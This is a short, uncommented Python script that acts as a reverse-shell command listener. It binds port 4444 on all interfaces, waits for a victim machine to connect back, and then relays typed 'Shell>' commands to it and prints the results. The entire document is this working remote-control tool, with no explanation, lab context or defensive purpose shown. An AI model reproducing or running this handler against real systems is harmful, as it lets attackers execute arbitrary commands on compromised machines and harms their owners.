import socket

host = '0.0.0.0'
port = 4444

s = socket.socket()
s.bind((host, port))
s.listen(1)
print(f"[+] Listening on port {port}...")

client_socket, client_address = s.accept()
print(f"[+] Connection from {client_address}")

while True:
    command = input("Shell> ")
    client_socket.send(command.encode())
    if command.lower() == 'exit':
        break
    result = client_socket.recv(1024).decode()
    print(result)

client_socket.close()

